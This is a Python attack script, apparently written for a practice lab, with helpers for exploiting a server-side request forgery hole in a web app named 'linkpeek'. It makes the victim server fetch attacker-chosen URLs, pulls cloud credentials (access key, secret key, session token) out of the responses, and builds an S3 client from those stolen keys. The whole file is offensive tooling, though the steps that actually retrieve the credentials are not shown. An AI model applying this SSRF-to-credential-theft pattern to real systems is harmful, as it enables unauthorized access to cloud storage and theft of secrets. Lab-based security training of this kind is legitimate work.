import json
import time

import boto3
import requests
from botocore.config import Config

TARGET = "http://linkpeek.example.com"       # the victim web application (public)
S3_ENDPOINT = "http://s3.cloud.local:9000"   # public S3 API endpoint


def mask(value: str, keep: int = 4) -> str:
    if not value:
        return value
    return value[:keep] + "*" * max(0, len(value) - 2 * keep) + value[-keep:]


def ssrf(url: str, save: bool = False, timeout: float = 15) -> dict:
    """Ask the victim server to fetch `url` for us."""
    t0 = time.perf_counter()
    r = requests.get(f"{TARGET}/api/fetch", params={"url": url, "save": "1" if save else "0"}, timeout=timeout)
    data = r.json()
    data["http"] = r.status_code
    data["client_ms"] = round((time.perf_counter() - t0) * 1000, 2)
    return data


def s3_with(creds: dict):
    return boto3.client("s3", endpoint_url=S3_ENDPOINT, region_name="us-east-1",
                        aws_access_key_id=creds["AccessKeyId"],
                        aws_secret_access_key=creds["SecretAccessKey"],
                        aws_session_token=creds.get("Token") or None,
                        config=Config(s3={"addressing_style": "path"}, retries={"max_attempts": 1}))


def parse_creds(content: str):
    try:
        c = json.loads(content)
        return c if "AccessKeyId" in c else None
    except (json.JSONDecodeError, TypeError):
        return None


def wait_ready(timeout: int = 120) -> None:
    end = time.time() + timeout
    while time.time() < end:
        try:
            if requests.get(f"{TARGET}/health", timeout=3).ok and \
                    requests.get(S3_ENDPOINT, timeout=3).status_code in (200, 403):
                return
        except requests.RequestException:
            pass
        time.sleep(1.5)
    raise SystemExit("lab not ready")
